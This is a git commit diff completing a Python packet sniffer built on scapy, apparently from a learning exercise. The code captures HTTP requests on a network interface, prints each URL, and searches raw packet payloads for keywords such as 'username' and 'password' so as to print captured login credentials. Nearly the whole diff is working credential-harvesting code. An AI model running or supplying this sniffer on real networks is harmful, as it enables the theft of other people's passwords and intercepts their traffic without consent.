7f90315f231ef51606bbdc157982fb6444b73861
root <root@localhost.localdomain>
2019-05-07 20:19:33 -0700

    Packet Sniffer complete.

--- Scripts/packet_sniffer.py
+++ Scripts/packet_sniffer.py
@@ -9,17 +9,27 @@ from scapy.layers import http
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
-def process_sniffed_packet(packet):
-    if packet.haslayer(http.HTTPRequest):
-        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        print(url)
-        if packet.haslayer(scapy.Raw):
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
             load = packet[scapy.Raw].load
             keywords = ["username", "user", "pass", "password", "login"]
             for kw in keywords:
                 if kw in load:
-                    print(load)
-                    break
+                    return load
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        url = get_url(packet)
+        print("[+] HTTP Request >> " + url)
+
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password > " + login_info + "\n\n")
+
+        
 
 
 def main():
